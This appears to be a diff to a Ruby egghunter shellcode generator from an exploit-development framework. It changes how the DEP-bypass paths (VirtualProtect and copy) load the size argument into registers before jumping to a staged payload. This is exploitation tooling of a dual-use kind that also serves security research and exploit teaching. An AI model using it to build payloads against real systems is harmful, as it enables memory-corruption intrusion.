@@ -69,6 +69,11 @@ class Egghunter
 
 				freeregs = [ "esi", "ebp", "ecx", "ebx" ]
 
+				reginfo = {
+					"ebx"=>["bx","bl","bh"],
+					"ecx"=>["cx","cl","ch"]
+				}
+
 				if opts[:depmethod]
 
 					if freeregs.index(apireg) == nil
@@ -102,29 +107,54 @@ class Egghunter
 						end
 					end
 
-
-					blockcnt = 0
-					vpsize = 0
-					blocksize = depsize
-					while blocksize >= 127
-						blocksize = blocksize / 2
-						blockcnt += 1
-					end
-					if blockcnt > 0
-						getsize << "xor #{sizereg},#{sizereg}\n\tadd #{sizereg},0x%02x\n\t" % blocksize
-						vpsize = blocksize
-						depblockcnt = 0
-						while depblockcnt < blockcnt
-							getsize << "add #{sizereg},#{sizereg}\n\t"	
-							vpsize += vpsize						
-							depblockcnt += 1
-						end
-						delta = depsize - vpsize
-						if delta > 0
-							getsize << "add #{sizereg},0x%02x\n\t" % delta
-						end
+					if depsize <= 127
+						getsize << "push 0x%02x\n\t" % depsize
 					else
-						getsize << "xor #{sizereg},#{sizereg}\n\tadd #{sizereg},0x%02x\n\t" % depsize	
+						sizebytes = "%04x" % depsize
+						low = sizebytes[2,4]
+						high = sizebytes[0,2]
+						if sizereg == "ecx" || sizereg == "ebx"
+							regvars = reginfo[sizereg]
+							getsize << "xor #{sizereg},#{sizereg}\n\t"
+							if low != "00" and high != "00"
+								getsize << "mov #{regvars[0]},0x%s\n\t" % sizebytes
+							elsif low != "00"
+								getsize << "mov #{regvars[1]},0x%s\n\t" % low
+							elsif high != "00"
+								getsize << "mov #{regvars[2]},0x%s\n\t" % high
+							end
+							getsize << "push #{sizereg}\n\t"
+						end
+						if sizereg == "ebp"
+							if low != "00" and high != "00"
+								getsize << "xor #{sizereg},#{sizereg}\n\t"
+								getsize << "mov bp,0x%s\n\t" % sizebytes
+								getsize << "push #{sizereg}\n\t"
+							end
+						end
+						# last resort
+						if getsize == ''
+							blockcnt = 0
+							vpsize = 0
+							blocksize = depsize
+							while blocksize > 127
+								blocksize = blocksize / 2
+								blockcnt += 1
+							end
+							getsize << "xor #{sizereg},#{sizereg}\n\tadd #{sizereg},0x%02x\n\t" % blocksize
+							vpsize = blocksize
+							depblockcnt = 0
+							while depblockcnt < blockcnt
+								getsize << "add #{sizereg},#{sizereg}\n\t"
+								vpsize += vpsize
+								depblockcnt += 1
+							end
+							delta = depsize - vpsize
+							if delta > 0
+								getsize << "add #{sizereg},0x%02x\n\t" % delta
+							end
+							getsize << "push #{sizereg}\n\t"
+						end
 					end
 				
 
@@ -132,21 +162,21 @@ class Egghunter
 						when "virtualprotect"
 							jmppayload = "push esp\n\tpush 0x40\n\t"
 							jmppayload << getsize
-							jmppayload << "push #{sizereg}\n\tpush edi\n\tpush edi\n\tpush #{apireg}\n\tret"
+							jmppayload << "push edi\n\tpush edi\n\tpush #{apireg}\n\tret"
 						when "copy"
 							jmppayload = getpc
 							jmppayload << "push edi\n\tpush #{apidest}\n\tpush #{apidest}\n\tpush #{apireg}\n\tmov edi,#{apidest}\n\tret"
 						when "copy_size"
 							jmppayload = getpc
 							jmppayload << getsize
-							jmppayload << "push #{sizereg}\n\tpush edi\n\tpush #{apidest}\n\tpush #{apidest}\n\tpush #{apireg}\n\tmov edi,#{apidest}\n\tret"
+							jmppayload << "push edi\n\tpush #{apidest}\n\tpush #{apidest}\n\tpush #{apireg}\n\tmov edi,#{apidest}\n\tret"
 					end
 				end
 
 				jmppayload << "\n" if jmppayload.length > 0
 
 				assembly = <<EOS
-#{getpointer}				
+#{getpointer}
 #{startstub}
 check_readable:
 	or dx,0xfff
